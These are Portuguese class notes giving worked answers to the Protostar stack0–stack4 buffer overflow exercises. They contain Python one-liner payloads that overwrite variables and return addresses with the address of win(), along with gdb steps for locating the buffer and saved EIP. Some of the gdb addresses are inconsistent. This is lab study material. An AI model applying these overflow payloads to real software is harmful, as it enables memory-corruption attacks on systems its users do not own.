tag3 - segurança ofensiva - respostas para stacks e formats


python -c "print('a'*74)" | ./stack0

./stack0
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa


./stack1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadcba

./stack1 "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa dcba"



./stack2

1º passo: cd /opt/protostar/bin
2º passo: GREENIE=$(python -c "print('a'*64 + '\x0a\x0d\x0a\x0d')")
3º passo: export GREENIE
4º passo: ./stack2


./stack3

endereço de win() --> 08048424 --> 08 04 84 24
little endian --> 24 84 04 08 --> \x24\x84\x04\x08

solução: python -c "print('a'*64 + '\x24\x84\x04\x08')" | ./stack3

./stack4

endereço de win() --> 080483f4 --> 08 04 83 f4
litte endian --> f4 83 04 08 --> \xf4\x83\x04\x08

solução: python -c "print('a'*(64 + 16) + '\xf4\x83\x04\x08')" | ./stack4

gdb -q ./stack4
break 15
run python -c "print('a'*64)"

print &buffer

info frame

buffer = 0xbffffb48
eip = 0xbffffb3c

buffer-adress = 0xbffffb78
eip-adress = 0xbffffb6c
